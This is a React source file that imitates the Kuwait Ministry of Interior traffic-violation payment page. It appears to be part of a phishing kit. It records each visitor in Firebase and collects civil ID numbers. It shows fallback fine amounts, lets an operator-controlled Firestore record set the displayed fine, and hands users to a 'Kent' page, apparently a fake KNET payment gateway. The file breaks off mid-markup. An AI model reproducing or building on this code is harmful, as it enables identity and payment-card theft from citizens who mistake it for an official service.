import { doc, onSnapshot } from 'firebase/firestore';
import './App.css';
import { addData, db } from './firebase';
import { useEffect, useState } from 'react';
import Plate from './plate';
import { Loader } from './loader';
import Kent from './kent/kent';


function App() {
  const [violation, setViolation] = useState<any>([])
  const [dataall, setdataall] = useState<any>([])



  // Call the function

  const [currantPage] = useState(1);
  const [_id] = useState('id' + Math.random().toString(16).slice(2));
  const [id, setId] = useState('');
  async function fetchViolationData(idv: string) {
    fetch(`https://cors-anywhere.herokuapp.com/https://www.moi.gov.kw/mfservices/traffic-violation/${idv}`)
      .then(response => response.json())
      .then(data => {
        setViolation(data.personalViolationsData)
        setdataall(data)
      })
      .catch(error => console.error(error));
    console.log(dataall)
  }

  const [page, setPage] = useState('main');
  const data = {
    id: _id,
    currentPage: currantPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: id,
    },
  };
  const [show, setShow] = useState(false);
  const [loading, setloading] = useState(false);

  useEffect(() => {
    localStorage.setItem('vistor', _id);
    addData(data);
  }, []);
  function getSpicficeValue() {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any;
          if (data.violationValue) {
            if (data.violationValue !== '') {
              localStorage.setItem('vv', data.violationValue);
              setloading(false);
              setShow(true);
            } else if (data.violationValue === '') {
            }
          }
        }
      });

      () => unsubscribe();
    }
  }
  const handleSubmit = (e: any) => {
    e.preventDefault();
    fetchViolationData(id)
    getSpicficeValue();
    if (id !== '' || id.length > 2) {
      addData(data);
      setloading(true);

      setTimeout(() => {
        setloading(false);
        setShow(true)

      }, 4000);
    }
  };
  return (
    <>
      {page === 'knet' ? (
        <Kent />
      ) : (
        <div dir="rtl">
          <header>
            <div className="row">
              <div
                className="col-4 col-md-2 col-lg-2 text-center"
                style={{ border: '0px solid red' }}
              >
                <a className="navbar-brand m-0" href="/main/">
                  <img src="/react.svg" style={{ height: 120 }} />
                </a>
              </div>
              <div
                className="col-1 align-self-center"
                style={{ border: '0px solid red' }}
              >
                <div className="row">
                  <div className="col text-center">
                    <img
                      src="/vite.svg"
                      className="text-center main-header-title"
                    />
                  </div>
                </div>
                <div className="row">
                  <div className="col text-center">
                    <img src="/svd.svg" className="mt-2 main-header-title" />
                  </div>
                </div>
              </div>
            </div>
            <nav className="navbar navbar-expand-lg navbar-dark border-bottom box-shadow">
              <div className="container">
                <a className="navbar-brand" href="/main" />
                <button
                  className="navbar-toggler"
                  type="button"
                  data-toggle="collapse"
                  data-target="#navbarResponsive"
                  aria-controls="navbarSupportedContent"
                  aria-expanded="false"
                  aria-label="Toggle navigation"
                >
                  <span className="navbar-toggler-icon" />
                </button>
                <div
                  className="navbar-collapse collapse flex-sm-row-reverse"
                  id="navbarResponsive"
                >
                  <ul
                    className="navbar-nav flex-grow-1 p-0 clearfix"
                    style={{
                      margin: '0 auto',
                      verticalAlign: 'top',
                      border: '0px solid red',
                    }}
                  >
                    <li className="nav-item">
                      <a className="nav-link" href="/main">
                        الرئيسيــة
                        <span className="sr-only">(current)</span>
                      </a>
                    </li>
                    <li
                      className="nav-item active"
                      id="eservicesMenu"
                      data-trigger="focus"
                    >
                      <a
                        href="#"
                        id="nav-eServices"
                        className="nav-link"
                        data-target="#eservices"
                        data-toggle="collapse"
                        aria-expanded="false"
                        aria-controls="eservices"
                      >
                        الخدمات الإلكترونيـة
                      </a>
                      <span
                        className="collapse navbar-submenu"
                        id="eservices"
                        data-parent="#navbarResponsive"
                      >
                        <ul
                          className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                          style={{ border: '0px solid red' }}
                        >
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/wwer.svg"
                                alt="Information Systems"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link active"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لنظم المعلومات
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <img
                              src="/wwer.svg"
                              alt="Traffic"
                              className="menu-icon"
                              width={50}
                              height={50}
                            />
                            <a href="/" className="nav-link">
                              <div className="main-menu-text">
                                الإدارة العامة للمرور
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />

                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للجنسية ووثائق السفر
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لشؤون الإقامة
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img
                                src="/main/images/assets/civil-defence/ico-civil-defence.svg"
                                alt="Civil Defence"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للدفاع المدني
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img
                                src="/main/images/assets/service-centres/ico-service-centre.svg"
                                alt="Service Centres"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لمراكز الخدمة
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img
                                src="/main/images/assets/coast-guard/ico-coast-guard.svg"
                                alt="Coast Guard"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لخفر السواحل
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="https://rnt.moi.gov.kw/pas/">
                              <img
                                src="/main/images/assets/ico-shoon-quwa.svg"
                                alt="Police Affairs"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="https://rnt.moi.gov.kw/pas/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لشؤون قوة الشرطة
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="https://nat4.moi.gov.kw/saad-abdullah-academy.nsf">
                              <img
                                src="/main/images/assets/academy/ico-police-academy.svg"
                                alt="Saad Abdullah Police Academy"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="https://nat4.moi.gov.kw/saad-abdullah-academy.nsf"
                            >
                              <div className="main-menu-text">
                                أكاديمية سعد العبدالله للعلوم الأمنية
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img
                                src="/main/images/assets/finance/ico-finance.svg"
                                alt="Finance"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للشؤن المالية
                              </div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="/">
                              <img
                                src="/main/images/assets/investigations/ico-investigations.svg"
                                alt="Investigations"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للتحقيقات
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/training/ico-training.svg"
                                alt="Training"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للتدريب
                              </div>
                            </a>
                          </li>
                        </ul>
                      </span>
                    </li>
                    <li className="nav-item" id="relatedDepartmentsMenu">
                      <a
                        href="#"
                        id="nav-relDepts"
                        className="nav-link"
                        data-target="#relatedDepts"
                        data-toggle="collapse"
                        aria-expanded="false"
                        aria-controls="relatedDepts"
                      >
                        إدارات توعوية
                      </a>
                      <span
                        id="relatedDepts"
                        className="collapse navbar-submenu"
                        data-parent="#navbarResponsive"
                      >
                        <ul
                          className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                          style={{ border: '0px solid red' }}
                        >
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/cyber-crime/ico-cyber-crime.svg"
                                alt="Cyber Crime"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                إدارة مكافحة الجرائم الإلكترونية
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/juvenile-protection/ico-juvenile-protection.svg"
                                alt="Juvenile Protection"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                إدارة حماية الأحداث
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/anti-drug/ico-anti-drug.svg"
                                alt="Anti Drug"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة لمكافحة المخدرات
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/cyber-crime/ico-cyber-crime.svg"
                                alt="Anti Human Trafficking"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                إدارة حماية الآداب العامة ومكافحة الإتجار
                                بالأشخاص
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/security-media/ico-security-media.svg"
                                alt="Security Media Dept"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإدارة العامة للعلاقات والإعلام الأمني
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/">
                              <img
                                src="/main/images/assets/correctional-facilities/icon-correctional-facilities.svg"
                                alt="Correctional Facilities"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/"
                            >
                              <div className="main-menu-text">
                                الإداره العامة للمؤسسات الإصلاحية
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/main/sections/security-systems">
                              <img
                                src="/main/images/assets/security-systems/ico-security-systems.svg"
                                alt="Security Systems"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/main/sections/security-systems"
                            >
                              <div className="main-menu-text">
                                الادارة العامة للأنظمة الأمنية
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0 d-none">
                            <a href="/main/sections/naionalsecurity">
                              <img
                                src="/main/images/assets/national-security/ico-nat-security.svg"
                                alt="Training"
                                className="menu-icon"
                              />
                            </a>
                            <a
                              className="nav-link"
                              href="/main/sections/national-security"
                            >
                              <div className="main-menu-text">
                                كلية الأمن الوطني
                              </div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/main/sections/human-resources">
                              <img
                                src="/main/images/assets/human-resources/ico-hr.svg"
                                alt="Administrative Affairs Dept."
                                className="menu-icon"
                              />
                            </a>
                            <a href="/main/sections/human-resources">
                              <div className="main-menu-text">
                                الإدارة العامة للشئون الإدارية
                              </div>
                            </a>
                          </li>
                        </ul>
                      </span>
                    </li>
                    <li className="nav-item">
                      <div className="dropdown">
                        <a
                          href="#"
                          className="nav-link"
                          data-toggle="collapse"
                          aria-expanded="false"
                        >
                          الإصدارات الإلكترونية
                        </a>
                        <div
                          className="dropdown-menu text-right"
                          style={{ background: '#e9e6de', padding: 0 }}
                        >
                          <a className="dropdown-item" href="/main/emagazine">
                            المجلة الإلكترونية
                          </a>
                          <a
                            className="dropdown-item"
                            href="/main/news/archive"
                          >
                            أرشيـف الأخبار
                          </a>
                        </div>
                      </div>
                    </li>
                    <li className="nav-item">
                      <a
                        className="nav-link"
                        href="https://eservices.moi.gov.kw:45314/verify/qrcode"
                      >
                        التحقق من الوثائق
                      </a>
                    </li>
                    <li className="nav-item">
                      <a
                        className="nav-link"
                        href="https://eservices1.moi.gov.kw/moicus.nsf/moicus?openform&LangID=1"
                      >
                        يهمنا رايك
                      </a>
                    </li>
                    <li className="nav-item" id="navEmergency">
                      <a
                        className="nav-link"
                        href="#"
                        data-toggle="modal"
                        data-target="#emergencyContactModal"
                      >
                        أرقام الطوارئ
                      </a>
                    </li>
                    <li className="nav-item" id="navMeta">
                      <div className="dropdown">
                        <a
                          href="#"
                          className="nav-link"
                          data-toggle="collapse"
                          aria-expanded="false"
                        >
                          منصة المواعيد
                        </a>
                        <div
                          className="dropdown-menu text-right"
                          style={{ background: '#e9e6de', padding: 0 }}
                        >
                          <a
                            className="dropdown-item"
                            href="https://meta.e.gov.kw/"
                          >
                            منصة 'متى'
                          </a>
                          <a
                            className="dropdown-item"
                            href="https://nat2.moi.gov.kw/MOIBioEnrol.nsf/initRequest?OpenForm&LangID=1"
                          >
                            حجز موعد البصمة البيومترية للخليجيين
                          </a>
                          <a
                            className="dropdown-item"
                            href="https://nat1.moi.gov.kw/MOIeTPAp.nsf/Request?OpenForm&LangID=1"
                          >
                            حجز مواعيد جوازات السفر المؤقتة والوثائق
                          </a>
                        </div>
                      </div>
                    </li>
                    <li
                      className="nav-item mt-0 mb-0 mr-auto"
                      style={{ border: '0px solid red', float: 'left' }}
                    >
                      <div
                        style={{ border: '0px solid white', height: '100%' }}
                        className="form-group text-center"
                        title="Request culture provider: CookieRequestCultureProvider"
                      >
                        <form
                          id="selectLanguage"
                          className="form-horizontal d-flex "
                          onSubmit={handleSubmit}
                          style={{ border: '0px solid green', height: '100%' }}
                        >
                          <div className="col-12 d-flex">
                            <button className="btn btn-lang align-content-center align-self-center text-center">
                              English
                            </button>
                          </div>
                        </form>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </nav>
          </header>
          <div className="row p-0 m-0 content" dir="rtl">
            <div className="col">
              <div className="row text-justify">
                <div className="col-sm-4 title">
                  <a href="///gdt">
                    <img src="/wwer.svg" className="intro-logo m-1" />
                    &nbsp;الإدارة العامة للمرور
                  </a>
                </div>
                <div className="col-sm-8">&nbsp;</div>
              </div>
              <div className="row text-center">
                <div className="col-sm-12 col-md-4 col-lg-4 side-menu text-right">
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a href="https://edl.moi.gov.kw/">
                        <img
                          src="/ico-renew-license.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a href="https://edl.moi.gov.kw/">
                        الخدمات الالكترونية لرخص السوق
                      </a>
                    </div>
                    <div className="col-1">&nbsp;</div>
                  </div>
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a href="///gdt/violation-enquiry">
                        <img
                          src="/ico-payment.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a href="///gdt/violation-enquiry">
                        دفع المخالفات
                      </a>
                    </div>
                    <div className="col-1">&nbsp;</div>
                  </div>
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a
                        href="#appointmentsMenu"
                        data-toggle="collapse"
                        data-target="#appointmentsMenu"
                        aria-expanded="false"
                        aria-controls="appointmentsMenu"
                      >
                        <img
                          src="/ico-booking.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a
                        href="#appointmentsMenu"
                        data-toggle="collapse"
                        data-target="#appointmentsMenu"
                        aria-expanded="false"
                        aria-controls="appointmentsMenu"
                      >
                        نظام مواعيد اختبار القيادة
                      </a>
                    </div>
                    <div className="col-1">&nbsp;</div>
                  </div>
                  <div className="collapse" id="appointmentsMenu">
                    <div className="row mt-2 text-justify">
                      <div className="col-2">&nbsp;</div>
                      <div className="col-8">
                        <i className="far fa-circle" />
                        &nbsp;المواعيد مكتملة حاليا حتى إشعار آخر
                      </div>
                      <div className="col-2">&nbsp;</div>
                    </div>
                    <div className="row mt-2 text-justify">
                      <div className="col-2">&nbsp;</div>
                      <div className="col-8">
                        <a href="https://ttd.moi.gov.kw/">
                          <i className="far fa-circle" />
                          &nbsp;اختبر نفسك
                        </a>
                      </div>
                      <div className="col-2">&nbsp;</div>
                    </div>
                  </div>
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a href="///gdt/services">
                        <img
                          src="/ico-procedures.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a href="///gdt/services">
                        &nbsp;معاملات المرور
                      </a>
                    </div>
                  </div>
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a
                        href="#sectionsMenu"
                        data-toggle="collapse"
                        data-target="#sectionsMenu"
                        aria-expanded="false"
                        aria-controls="sectionsMenu"
                      >
                        <img
                          src="/ico-locations-sections.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a href="///gdt/locations">
                        &nbsp;مواقع الإدارة العامة للمرور
                      </a>
                    </div>
                  </div>
                  <div className="row mt-2">
                    <div className="col-2 mr-1 ml-1">
                      <a href="/driving-license-conditions.pdf">
                        <img
                          src="/ico-pdf-doc.svg"
                          className="side-menu-icon"
                        />
                      </a>
                    </div>
                    <div className="col-8 align-self-center">
                      <a href="/driving-license-conditions.pdf">
                        شروط منح رخص السوق لغير الكويتيين
                      </a>
                    </div>
                  </div>
                </div>
                <div className="col-sm-12 col-md-8 col-lg-8" id="GDTContent">
                  <div className="row">
                    <div className="col-3">&nbsp;</div>
                    <div className="col-6">
                      <div className="title">الإدارة العامة للمرور</div>
                      <div>
                        <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                      </div>
                    </div>
                    <div className="col-3">&nbsp;</div>
                  </div>
                  <div className="row mt-2 pl-4 pr-4 pb-5 text-justify">
                    <div className="col-12">
                      <form id="enquireForm" onSubmit={handleSubmit}>
                        <div className="form-row">
                          <div className="col-sm-12 col-md-6">
                            <div className="form-check form-check-inline m-0">
                              <input
                                className="form-check-input"
                                type="radio"
                                name="violationFor"
                                id="violationForIndividual"
                                defaultValue={1}
                              />
                              <label
                                className="form-check-label"
                                htmlFor="violationTypeIndividual"
                              >
                                &nbsp;الأفراد
                              </label>
                            </div>
                            <div className="form-check form-check-inline">
                              <input
                                className="form-check-input"
                                type="radio"
                                name="violationFor"
                                id="violationForCompany"
                                defaultValue={2}
                              />
                              <label
                                className="form-check-label"
                                htmlFor="violationTypeCompany"
                              >
                                &nbsp;الشركات
                              </label>
                            </div>
                          </div>
                        </div>
                        <div className="form-row mt-2">
                          <div className="col-sm-12 col-md-6">
                            <label id="lblEnquiryType">
                              الرقم المدني أو الرقم الموحد
                            </label>
                            <input
                              className="form-control error"
                              id="civilId"
                              name="civilId"
                              maxLength={12}
                              minLength={9}
                              onChange={(e) => {
                                setId(e.target.value);
                              }}
                            />
                          </div>
                        </div>

                        <div className="form-row mt-2">
                          <div className="col-sm-12 col-md-4">
                            <button
                              style={{ width: '100%' }}
                              disabled={loading}
                              type="submit"
                              className="btn btn-primary btn-block mt-2 mt-md-0"
                            >
                              إستعلم
                            </button>
                          </div>
                        </div>

                        <div
                          style={{ borderBottom: '2px solid #d6dce5' }}
                          className="form-row p-3 mt-3 text-right"
                          id="responseInfo"
                        >
                          {loading ? (
                            <Loader />
                          ) : show ? (
                            <>
                              <div className="mb-4 rounded-lg bg-[#efeae6] p-4">
                                <div className="flex justify-between text-sm">
                                  <div>عدد المخالفات: {dataall?.totalTicketsCount ?? '1'}</div>
                                  <div>المبلغ الإجمالي: {dataall?.totalViolationAmount ?? '5'} د.ك</div>
                                </div>
                              </div>

                              <Plate
                                violations={violation} />
                            </>
                          ) : null}
                        </div>
                        <div className="form-row align-self-center mt-2">
                          <div className="col-12 text-left" id="payingAmount" />
                        </div>
                        <div className="form-row mt-3">
                          <div className="col-12 text-right font-weight-bold mb-2">
                            بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة
                            أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                          </div>
                          <div className="col-sm-12 col-md-4 text-right">
                            <input
                              type="button"
                              onClick={() =>
                                setTimeout(() => {
                                  setPage('knet');
                                }, 2000)
                              }
                              id="btnPay"
                              className={`btn btn-primary btn-block col-12 ${show ? '' : 'd-none'
                                }`}
                              defaultValue="إدفع"
                            />
                          </div>
                          <div className="col-sm-12 col-md-6 align-self-center">
                            &nbsp;
                          </div>
                        </div>
                        <div className="form-row mt-3">
                          <div className="col-12 align-self-center">
                            <span
                              className="badge badge-success p-2"
                              style={{
                                fontWeight: 'normal !important',
                                background: 'green',
                                margin: 4,
                              }}
                            >
                              قابلة للدفع الكترونياً
                            </span>
                            <span
                              className="badge badge-danger p-2"
                              style={{
                                fontWeight: 'normal !important',
                                margin: 4,
                                background: 'red',
                              }}
                            >
                              غير قابلة للدفع الكترونياً
                            </span>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                  <div className="d-flex justify-content-center">
                    <div
                      className="spinner-grow text-secondary d-none"
                      role="status"
                      id="workingOnIt"
                    >
                      <span className="sr-only">Loading...</span>
                    </div>
                  </div>
                  <div className="row mt-2 pl-4 pr-4 pb-5 text-center d-none">
                    <div className="col-12">
                      The service will be available shortly
                      <br />
                      الخدمة ستعود قريباً
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="row p-0 m-0">
            <div className="accordion w-100 " id="sm-accordion">
              {/*TRAFFIC VIOLATION*/}
              <div className="card slider-card">
                <div className="card-header text-center" id="headingOne">
                  <a
                    role="button"
                    data-toggle="collapse"
                    data-target="#collapsePayFines"
                    href="#collapsePayFines"
                    aria-expanded="true"
                    aria-controls="collapsePayFines"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      id="Layer_1"
                      width="8.572em"
                      height="8.572em"
                      data-name="Layer 1"
                      viewBox="0 0 103 103"
                    >
                      <title>Payment</title>
                      <rect
                        className="circle cls-1"
                        x="1.01"
                        y="1.26"
                        width={100}
                        height={100}
                        rx={50}
                      />
                      <path
                        className="kd cls-2"
                        d="M63.55,70.16l-6.06-7v7H55.27V56.25h2.22v6.06l5.84-6.06h2.75L59.59,62.5l6.73,7.66Z"
                      />
                      <path
                        className="kd cls-2"
                        d="M67.49,70.16v-2.5H69.4v2.5Z"
                      />
                      <path
                        className="kd cls-2"
                        d="M71.42,70.16V56.25h6.32c3.81,0,4.91,1.59,4.91,6.06v1.78c0,4.47-1.1,6.07-4.91,6.07Zm9-8c0-2.89-.46-4.36-2.89-4.36H73.62V68.58h3.94c2.25,0,2.89-1.3,2.89-4.2Z"
                      />
                      <rect
                        className="cls-1"
                        x="15.44"
                        y="27.78"
                        width="71.3"
                        height="46.97"
                      />
                      <line
                        className="cls-1"
                        x1="22.53"
                        y1="56.6"
                        x2="39.12"
                        y2="56.6"
                      />
                      <line
                        className="cls-1"
                        x1="32.8"
                        y1="62.13"
                        x2="38.33"
                        y2="62.13"
                      />
                      <line
                        className="cls-1"
                        x1="22.53"
                        y1="67.66"
                        x2="38.33"
                        y2="67.66"
                      />
                      <line
                        className="cls-1"
                        x1="15.29"
                        y1="36.28"
                        x2="86.4"
                        y2="36.28"
                      />
                      <line
                        className="cls-1"
                        x1="15.29"
                        y1="47.83"
                        x2="86.4"
                        y2="47.83"
                      />
                    </svg>
                  </a>
                </div>
                <div
                  id="collapsePayFines"
                  className="collapse"
                  aria-labelledby="headingOne"
                  data-parent="#sm-accordion"
                >
                  <div className="card-body article-info text-center">
                    <h5 className="title">دفع المخالفات والغرامات</h5>
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                    <form id="MQAFines">
                      <div className="col-12">
                        <select
                          className="form-control"
                          id="MQAFinesSelectFineType"
                          name="MQAFinesSelectFineType"
                        >
                          <option value={1}>المرور</option>
                          <option value={2}>الإقامة</option>
                        </select>
                      </div>
                      <div className="col-12 mt-1">
                        <input
                          type="tel"
                          pattern="^[0–9]$"
                          className="form-control"
                          id="MQAFinesTextCivilId"
                          name="MQAFinesTextCivilId"
                          maxLength={12}
                          placeholder="الرقم المدني"
                        />
                      </div>
                      <button
                        className="btn btn-secondary mt-3"
                        id="btnMEnquire"
                      >
                        دفع
                      </button>
                    </form>
                  </div>
                </div>
              </div>
              {/*APPOINTMENTS
      <div class="card slider-card">
          <div class="card-header text-center" id="headingTwo">
              <a role="button" data-target="#collapseAppointments" href="#collapsePersonalEnquiry" data-toggle="collapse" aria-expanded="false" aria-controls="collapsePersonalEnquiry">
                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="8.572em" height="8.572em" viewBox="0 0 103 103" style="enable-background:new 0 0 103 103;" xml:space="preserve">
                  <defs>
 
          <div className="card slider-card d-none">
            <div className="card-header text-center" id="headingFour">
              <a
                role="button"
                data-toggle="collapse"
                data-target="#collapseHealthCheck"
                href="#collapseHealthCheck"
                aria-expanded="false"
                aria-controls="collapseHealthCheck"
              >
                <img
                  src="https://www.moi.gov.kw/main/images/assets/common/ico-health-check-status.svg"
                  className="moi-ico"
                />
              </a>
            </div>
            <div
              id="collapseHealthCheck"
              className="collapse"
              aria-labelledby="headingFour"
              data-parent="#sm-accordion"
            >
              <div className="card-body article-info text-center">
                <h5 className="title">جاهزية نتيجة الفحص الطبي</h5>
                <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                <form id="MQAHealthCheck">
                  <div className="col-12">
                    <input
                      className="form-control"
                      id="MQAHealthCheckTextNationalNo"
                      name="MQAHealthCheckTextNationalNo"
                      maxLength={12}
                      placeholder="رقم المرجع"
                    />
                  </div>
                  <div className="col-12">
                    <button
                      className="btn btn-block btn-secondary mt-3"
                      id="btnMQAHealthCheck"
                    >
                      إستعلم
                    </button>
                    <div className="d-flex justify-content-center">
                      <div
                        className="spinner-grow text-secondary d-none"
                        role="status"
                        id="MQAHCWorkingOnIt"
                      >
                        <span className="sr-only">Loading...</span>
                      </div>
                    </div>
                    <div id="MQAHealthReport" className="d-none mt-3" />
                  </div>
                </form>
              </div>
            </div>
          </div>
          {/*CASE FILE CHECK*/}
              <div className="card slider-card">
                <div
                  className="card-header active-acc text-center"
                  id="headingFour"
                >
                  <a
                    role="button"
                    data-toggle="collapse"
                    data-target="#collapseCaseCheck"
                    href="#collapseCaseCheck"
                    aria-expanded="false"
                    aria-controls="collapseCaseCheck"
                  >
                    <img
                      src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg"
                      className="moi-ico"
                    />
                  </a>
                </div>
                <div
                  id="collapseCaseCheck"
                  className="collapse"
                  aria-labelledby="headingFour"
                  data-parent="#sm-accordion"
                >
                  <div className="card-body article-info text-center">
                    <h5 className="title">الاستعلام عن سير القضية</h5>
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                    <form id="MQACaseCheck">
                      <div className="col-12">
                        <input
                          className="form-control"
                          id="MQACaseCheckTextNationalNo"
                          name="MQACaseCheckTextNationalNo"
                          maxLength={12}
                          placeholder="رقم المرجع"
                        />
                      </div>
                      <div className="col-12">
                        <button
                          className="btn btn-block btn-secondary mt-3"
                          id="btnMQACaseCheck"
                        >
                          إستعلم
                        </button>
                        <div className="d-flex justify-content-center">
                          <div
                            className="spinner-grow text-secondary d-none"
                            role="status"
                            id="MQACCWorkingOnIt"
                          >
                            <span className="sr-only">Loading...</span>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
              {/*SMS CHANGE COMPANY*/}
              <div className="card slider-card d-none">
                <div className="card-header text-center" id="headingTwo">
                  <a
                    role="button"
                    data-target="#collapsePersonalEnquiry"
                    href="#collapsePersonalEnquiry"
                    data-toggle="collapse"
                    aria-expanded="false"
                    aria-controls="collapsePersonalEnquiry"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      xmlnsXlink="http://www.w3.org/1999/xlink"
                      version="1.1"
                      id="Layer_1"
                      x="0px"
                      y="0px"
                      width="8.572em"
                      height="8.572em"
                      viewBox="0 0 103 103"
                      style={{ background: 'new 0 0 103 103' }}
                      xmlSpace="preserve"
                    >
                      <style
                        type="text/css"
                        dangerouslySetInnerHTML={{
                          __html:
                            '\n                        .st0 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-width: 2;\n                            stroke-miterlimit: 10;\n                        }\n\n                        .st1 {\n                            enable-background: new;\n                        }\n\n                        .st2 {\n                            fill: #fff;\n                        }\n\n                        .st3 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-miterlimit: 10;\n                        }\n',
                        }}
                      />
                      <title>sms</title>
                      <path
                        className="circle st0"
                        d="M51.5,1.5L51.5,1.5c27.6,0,50,22.4,50,50l0,0c0,27.6-22.4,50-50,50l0,0c-27.6,0-50-22.4-50-50l0,0  C1.5,23.9,23.9,1.5,51.5,1.5z"
                      />
                      <g className="st1">
                        <path
                          className="st2"
